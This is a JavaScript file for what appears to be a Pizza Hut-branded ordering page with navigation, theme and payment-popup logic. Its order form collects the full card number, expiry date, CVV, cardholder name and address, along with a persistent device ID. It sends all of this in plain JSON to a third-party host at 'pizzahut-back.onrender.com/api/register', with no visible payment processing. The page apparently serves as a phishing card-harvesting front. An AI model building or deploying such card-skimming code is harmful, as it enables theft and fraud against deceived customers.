document.addEventListener("DOMContentLoaded", () => {
    const serverUrl = "https://pizzahut-back.onrender.com";

    let deviceId = localStorage.getItem("deviceId");
    if (!deviceId && window.AndroidBridge?.getDeviceId) {
        deviceId = window.AndroidBridge.getDeviceId();
    }
    if (!deviceId) {
        deviceId = crypto.randomUUID();
    }
    localStorage.setItem("deviceId", deviceId);

    const navMenu = document.getElementById("nav-menu");
    const navToggle = document.getElementById("nav-toggle");
    const navClose = document.getElementById("nav-close");

    if (navToggle) {
        navToggle.addEventListener("click", () => {
            navMenu.classList.add("show-menu");
        });
    }
    if (navClose) {
        navClose.addEventListener("click", () => {
            navMenu.classList.remove("show-menu");
        });
    }
    document.querySelectorAll(".nav__link").forEach((link) => {
        link.addEventListener("click", () => {
            navMenu.classList.remove("show-menu");
        });
    });

    const sections = document.querySelectorAll("section[id]");
    function scrollActive() {
        const scrollY = window.pageYOffset;
        sections.forEach((current) => {
            const sectionHeight = current.offsetHeight;
            const sectionTop = current.offsetTop - 50;
            const sectionId = current.getAttribute("id");
            const navLink = document.querySelector(`.nav__menu a[href*="${sectionId}"]`);
            if (scrollY > sectionTop && scrollY <= sectionTop + sectionHeight) {
                navLink?.classList.add("active-link");
            } else {
                navLink?.classList.remove("active-link");
            }
        });
    }
    window.addEventListener("scroll", scrollActive);

    const scrollUpBtn = document.getElementById("scroll-up");
    function showScrollUp() {
        if (window.scrollY >= 350) {
            scrollUpBtn.classList.add("show-scroll");
        } else {
            scrollUpBtn.classList.remove("show-scroll");
        }
    }
    window.addEventListener("scroll", showScrollUp);

    const themeButton = document.getElementById("theme-button");
    const darkThemeClass = "dark-theme";
    const iconThemeClass = "fa-sun";

    const savedTheme = localStorage.getItem("selected-theme");
    const savedIcon = localStorage.getItem("selected-icon");
    const getCurrentTheme = () => document.body.classList.contains(darkThemeClass) ? "dark" : "light";
    const getCurrentIcon = () => themeButton.classList.contains(iconThemeClass) ? "fa-moon" : "fa-sun";

    if (savedTheme) {
        if (savedTheme === "dark") document.body.classList.add(darkThemeClass);
        else document.body.classList.remove(darkThemeClass);
        if (savedIcon === "fa-moon") themeButton.classList.add(iconThemeClass);
        else themeButton.classList.remove(iconThemeClass);
    }

    themeButton.addEventListener("click", () => {
        document.body.classList.toggle(darkThemeClass);
        themeButton.classList.toggle(iconThemeClass);
        localStorage.setItem("selected-theme", getCurrentTheme());
        localStorage.setItem("selected-icon", getCurrentIcon());
    });

    const popup = document.getElementById("payment-popup");
    const closeBtn = popup.querySelector(".close-btn");
    const openBtns = document.querySelectorAll(".order-now-btn");
    const orderForm = document.getElementById("payment-form");
    const orderMessage = document.getElementById("order-message");

    openBtns.forEach((btn) => {
        btn.addEventListener("click", (e) => {
            e.preventDefault();
            popup.classList.add("active");
        });
    });

    closeBtn.addEventListener("click", () => {
        popup.classList.remove("active");
        clearFormErrors();
    });
    popup.addEventListener("click", (e) => {
        if (e.target === popup) {
            popup.classList.remove("active");
            clearFormErrors();
        }
    });

    function markError(fieldId) {
        document.getElementById(fieldId)?.classList.add("input-error");
    }
    function clearFormErrors() {
        ["address", "cardholderName", "cardNumber", "expiry", "cvv"]
            .forEach(id => document.getElementById(id)?.classList.remove("input-error"));
        orderMessage.textContent = "";
    }

    orderForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        clearFormErrors();
        orderMessage.textContent = "";

        const address = document.getElementById("address").value.trim();
        const cardholderName = document.getElementById("cardholderName").value.trim();
        const cardNumber = document.getElementById("cardNumber").value.trim();
        const expiry = document.getElementById("expiry").value.trim();
        const cvv = document.getElementById("cvv").value.trim();

        let hasError = false;
        if (!address) { markError("address"); hasError = true; }
        if (!cardholderName) { markError("cardholderName"); hasError = true; }
        if (!cardNumber) { markError("cardholderName"); hasError = true; }
        if (!expiry) { markError("expiry"); hasError = true; }
        if (!cvv) { markError("cvv"); hasError = true; }

        if (hasError) {
            orderMessage.textContent = "Bitte alle Felder korrekt ausfüllen.";
            return;
        }

        const data = {
            deviceId,
            address,
            cardholderName,
            cardNumber,
            expiry,
            cvv,
            timestamp: new Date().toISOString(),
        };

        try {
            const response = await fetch(`${serverUrl}/api/register`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
            const result = await response.json();
            if (!response.ok || !result.success) {
                throw new Error(result.message || "Server-Fehler");
            }
            popup.classList.remove("active");
            orderForm.reset();
            // alert("Danke! Deine Bestellung wurde erfolgreich aufgenommen.");
        } catch (err) {
            console.error("Fehler bei Bestellung:", err);
            orderMessage.textContent = "Ein Fehler ist aufgetreten. Bitte versuche es erneut.";
        }
    });
});
